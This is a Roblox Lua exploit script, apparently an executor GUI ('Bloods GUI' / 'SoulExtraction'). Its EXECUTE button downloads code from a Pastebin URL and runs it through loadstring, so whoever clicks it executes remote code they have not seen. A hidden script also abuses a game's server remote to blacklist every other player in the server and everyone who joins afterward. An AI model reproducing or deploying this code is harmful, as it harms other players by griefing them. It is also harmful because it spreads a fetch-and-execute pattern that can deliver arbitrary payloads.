-- Farewell Infortality.
-- Version: 2.82
-- Instances:
local ScreenGui = Instance.new("ScreenGui")
local SoulExtraction = Instance.new("Frame")
local Execution = Instance.new("TextButton")
local Close = Instance.new("TextButton")
--Properties:
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

SoulExtraction.Name = "SoulExtraction"
SoulExtraction.Parent = ScreenGui
SoulExtraction.BackgroundColor3 = Color3.new(0, 0, 0)
SoulExtraction.Position = UDim2.new(0, 0, 0.827076197, 0)
SoulExtraction.Size = UDim2.new(0, 305, 0, 152)

Execution.Name = "Execution"
Execution.Parent = SoulExtraction
Execution.BackgroundColor3 = Color3.new(0.207843, 0, 0)
Execution.BorderSizePixel = 0
Execution.Position = UDim2.new(0.170876786, 0, 0.331161231, 0)
Execution.Size = UDim2.new(0, 200, 0, 50)
Execution.Font = Enum.Font.SourceSans
Execution.Text = "EXECUTE"
Execution.TextColor3 = Color3.new(0.819608, 0, 0)
Execution.TextSize = 14

Close.Name = "Close"
Close.Parent = SoulExtraction
Close.BackgroundColor3 = Color3.new(0, 0, 0)
Close.Position = UDim2.new(0, 273, 0, 0)
Close.Size = UDim2.new(0, 32, 0, 24)
Close.Font = Enum.Font.SourceSans
Close.Text = "X"
Close.TextColor3 = Color3.new(1, 0, 0)
Close.TextSize = 14
-- Scripts:
function SCRIPT_XCMM65_FAKESCRIPT() -- Execution.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Execution
	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/aFBEUkWM'),true))()
	end)

end
coroutine.resume(coroutine.create(SCRIPT_XCMM65_FAKESCRIPT))
function SCRIPT_FPCS90_FAKESCRIPT() -- Close.LocalScript 
	local script = Instance.new('LocalScript')
	script.Parent = Close
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
	end)

end
coroutine.resume(coroutine.create(SCRIPT_FPCS90_FAKESCRIPT))
function SCRIPT_KTAM79_FAKESCRIPT() -- ScreenGui.AutoBL 
	local script = Instance.new('Script')
	script.Parent = ScreenGui
	Mouse = game.Players.LocalPlayer:GetMouse()
	
	Instance.new('RemoteEvent', game:service'ReplicatedStorage'.Interaction).Name = "Ban"
	
	Client = game.ReplicatedStorage.Interaction.ClientSetListPlayer
	players = game.Players
	for i, v in pairs(players:GetPlayers()) do
		if v.Name ~= players.LocalPlayer.Name then
			Client:InvokeServer(players.LocalPlayer.BlacklistFolder, v, true)
		end
	end
	players.PlayerAdded:connect(function(plr)
		Client:InvokeServer(players.LocalPlayer.BlacklistFolder, plr, true)
	end)
	
	game:GetService("StarterGui"):SetCore("SendNotification", {
	  Title = "BLOOD",
	  Text = "Loaded Successful."
	})
	
	local players = game:GetService('Players')
	if game.Players.LocalPlayer then 
	game.StarterGui:SetCore('SendNotification', {
	    Title = ' '.. players.LocalPlayer.Name..'!',
	    Text = 'Welcome to Bloods GUI!',
	    Icon = [[http://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userName=]]..players.LocalPlayer.Name..[[&RAND]] .. math.random(1,10000000),
	    Duration = 5,
	   })
	  end
	
	--Soulmasss ;)

end
coroutine.resume(coroutine.create(SCRIPT_KTAM79_FAKESCRIPT))
